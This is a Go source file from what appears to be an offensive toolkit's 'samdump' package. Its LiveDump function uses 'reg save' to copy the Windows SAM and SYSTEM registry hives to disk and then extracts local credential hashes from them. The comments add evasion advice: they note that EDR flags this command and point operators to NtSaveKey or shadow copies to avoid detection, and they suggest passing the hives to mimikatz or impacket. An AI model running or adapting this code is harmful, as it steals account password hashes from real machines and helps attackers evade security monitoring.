//go:build windows

package samdump

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// Live-mode helpers for SAM dumping. The acquisition strategy here
// is `reg save` — the simplest path that works against the live
// SAM/SYSTEM hives without needing VSS shadow-copy enumeration:
//
//   - reg save HKLM\SYSTEM <path> /y
//   - reg save HKLM\SAM    <path> /y
//
// Both require admin + SeBackupPrivilege. The reg.exe utility opens
// the registry key with READ_CONTROL|KEY_READ then calls
// RegSaveKeyEx to serialize the in-memory tree to the on-disk hive
// format. Even though the live hive files (C:\Windows\System32\
// config\{SAM,SYSTEM}) are held open by the kernel, the registry
// API can produce a valid copy through the in-memory tree.
//
// VSS shadow-copy acquisition (for files reg-save can't reach, e.g.
// lsass dumps or NTDS.dit) is a separate effort tracked under
// recon/shadowcopy.
//
// Detection level: HIGH for `reg save` — Defender's behavioral
// telemetry flags `reg.exe save HKLM\SAM` as one of the loudest
// credential-dumping signals an EDR can watch. Operators wanting
// to reduce that surface should call NtSaveKey directly through
// win/ntapi or use VSS via recon/shadowcopy.

// ErrLiveDump is returned when live acquisition fails — `reg save`
// not on PATH, admin privileges missing, target hive locked by
// another process, etc.
var ErrLiveDump = errors.New("samdump: live dump failed")

// LiveDump runs the offline algorithm against the live SYSTEM + SAM
// hives, captured via `reg save` to a caller-controlled `dir`.
// The two hive files are written to dir as `system.hive` and
// `sam.hive`; the operator is responsible for cleaning them up
// (typically a t.TempDir() in tests, or a defer os.RemoveAll in
// production).
//
// Returns Result identical to what Dump() would produce against
// the same hives plus the on-disk paths so operators can re-feed
// the files to a different tooling chain (impacket, mimikatz, etc.)
// without re-acquiring.
func LiveDump(dir string) (Result, string, string, error) {
	if dir == "" {
		var err error
		dir, err = os.MkdirTemp("", "samdump-live-")
		if err != nil {
			return Result{}, "", "", errors.Join(ErrLiveDump,
				fmt.Errorf("MkdirTemp: %w", err))
		}
	}
	if err := os.MkdirAll(dir, 0700); err != nil {
		return Result{}, "", "", errors.Join(ErrLiveDump, fmt.Errorf("MkdirAll %s: %w", dir, err))
	}

	systemPath := filepath.Join(dir, "system.hive")
	samPath := filepath.Join(dir, "sam.hive")

	if out, err := exec.Command("reg", "save", `HKLM\SYSTEM`, systemPath, "/y").CombinedOutput(); err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump,
			fmt.Errorf("reg save HKLM\\SYSTEM: %w (%s)", err, string(out)))
	}
	if out, err := exec.Command("reg", "save", `HKLM\SAM`, samPath, "/y").CombinedOutput(); err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump,
			fmt.Errorf("reg save HKLM\\SAM: %w (%s)", err, string(out)))
	}

	systemFile, err := os.Open(systemPath)
	if err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump, err)
	}
	defer systemFile.Close()
	systemStat, err := systemFile.Stat()
	if err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump, err)
	}

	samFile, err := os.Open(samPath)
	if err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump, err)
	}
	defer samFile.Close()
	samStat, err := samFile.Stat()
	if err != nil {
		return Result{}, systemPath, samPath, errors.Join(ErrLiveDump, err)
	}

	res, err := Dump(systemFile, systemStat.Size(), samFile, samStat.Size())
	if err != nil {
		return res, systemPath, samPath, errors.Join(ErrLiveDump, err)
	}
	return res, systemPath, samPath, nil
}
